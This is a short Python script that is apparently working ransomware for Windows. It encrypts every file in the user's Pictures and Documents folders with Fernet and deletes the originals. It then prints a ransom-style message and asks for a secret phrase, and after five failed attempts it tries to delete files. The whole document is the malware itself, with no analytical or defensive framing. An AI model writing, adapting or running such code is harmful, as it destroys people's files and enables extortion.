from cryptography.fernet import Fernet as fen
import os
import platform
global path, user, dirs


x = platform.uname()
if x.system == "Windows":
    user = os.getenv("USERNAME")
    path = f'C:\\Users\\{user}\\AppData\\Roaming\\keys\\'
    pics = f"C:\\Users\\{user}\\Pictures\\"
    docs = f"C:\\Users\\{user}\\Documents\\"
    dirs = [pics, docs]


def gen_key():
    if os.path.exists(f"{path}mykey.key"):
        with open(f'{path}mykey.key', 'rb') as keys:
            key = keys.read()
        return key
    else:
        os.mkdir(path)
        key = fen.generate_key()
        with open(f'{path}mykey.key', 'wb') as keys:
            keys.write(key)
        return key


def encrypt(key):
    f = fen(key)
    for d in dirs:
        for ddir in os.listdir(d):
            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Music":
                continue
            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
                continue
            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Videos":
                continue
            with open(f"{d}{ddir}", 'rb') as files:
                files = files.read()

            enc_pass = f.encrypt(files)

            with open(f"{d}encrypted - {ddir}", 'wb') as enc_files:
                enc_files.write(enc_pass)
            os.remove(f"{d}{ddir}")


def decrypt(key):
    f = fen(key)
    for d in dirs:
        for ddir in os.listdir(d):
            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Music":
                continue
            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
                continue
            if f"{d}{ddir}" == f"C:\\Users\\{user}\\Documents\\My Videos":
                continue
            # print(f"{i}{dir}")
            with open(f"{d}{ddir}", 'rb') as files:
                files = files.read()

            enc_pass = f.decrypt(files)

            with open(f"{d}{str(ddir).replace('encrypted - ','')}", 'wb') as enc_files:
                enc_files.write(enc_pass)
            os.remove(f"{d}{ddir}")


lol = gen_key()

encrypt(lol)
x = 0
phrase = "it was never meant to be"
print("All your files have been encrypted ! \n THIS IS NOT A TEST !\n")
print("Enter the secret key to get your files back")
while True:
    response = input(">> ")
    if response.endswith(phrase):
        print("Phrase is correct")
        decrypt(lol)
        exit("Enjoy ;)")
    else:
        x += 1
        print(f"Phrase is incorrect, {5-x} attempts left")
        if x == 5:
            print("well... i guess i would have to delete all your files then :) ")
            print("\n GOOD BYE")

            for x in dirs:
                for r in os.listdir(x):
                    if f"{x}{r}" == "C:\\Users\\aki\\Documents\\My Music":
                        continue
                    if f"{x}{r}" == "C:\\Users\\aki\\Documents\\My Pictures":
                        continue
                    if f"{x}{r}" == "C:\\Users\\aki\\Documents\\My Videos":
                        continue
                    os.remove(x)
                    exit("Enjoy ;)")
